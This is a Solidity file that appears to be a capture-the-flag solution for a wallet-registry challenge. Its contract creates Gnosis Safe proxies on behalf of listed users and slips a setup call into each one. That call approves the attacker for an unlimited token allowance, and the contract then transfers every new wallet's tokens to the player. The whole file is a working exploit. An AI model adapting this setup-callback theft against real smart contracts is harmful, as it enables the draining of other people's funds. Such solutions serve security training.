// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract BackdoorApprover {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract BackdoorAttacker {

    address public immutable player;
    address[] public users;
    WalletRegistry public immutable walletRegistry;
    GnosisSafe public immutable masterCopy;
    GnosisSafeProxyFactory public immutable walletFactory;
    IERC20 public immutable token;
    BackdoorApprover public approver;

    constructor(address _walletRegistry, address[] memory _users) {
        player = msg.sender;
        walletRegistry = WalletRegistry(_walletRegistry);
        users = _users;
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        walletFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        token = walletRegistry.token();
        approver = new BackdoorApprover();
        attack();
    }

    function attack() public {
        bytes memory callData;
        address[] memory owners = new address[](1);
        address wallet;
        for (uint i = 0; i < 4; i++) {
            owners[0] = users[i];
            callData = abi.encodeCall(GnosisSafe.setup, (
                owners, // _owners
                1, // _threshold
                address(approver), // to
                abi.encodeCall(approver.approve, (address(this), token)), // data
                address(0), // fallbackHandler
                address(token), // paymentToken
                0, // payment
                payable(player) // paymentReceiver
            ));
            wallet = address(walletFactory.createProxyWithCallback(address(masterCopy), callData, 0, walletRegistry));
            token.transferFrom(wallet, player, token.balanceOf(wallet));
        }
    }
}